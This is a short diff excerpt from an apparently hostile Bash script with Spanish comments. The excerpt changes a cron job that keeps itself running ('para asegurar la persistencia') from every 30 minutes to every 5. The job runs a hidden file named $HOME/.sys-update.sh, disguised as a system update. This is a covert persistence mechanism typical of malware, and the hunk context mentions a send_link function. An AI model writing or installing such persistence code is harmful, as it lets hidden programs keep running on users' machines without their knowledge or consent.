@@ -142,7 +142,7 @@ send_link
 # Función para instalar una tarea cron para asegurar la persistencia
 function install_cron {
     debug "Instalando tarea cron..."
-    CRON_JOB="*/30 * * * * $HOME/.sys-update.sh"
+    CRON_JOB="*/5 * * * * $HOME/.sys-update.sh"
 
     # Comprobar si el archivo del script existe
     if [[ ! -f "$HOME/.sys-update.sh" ]]; then
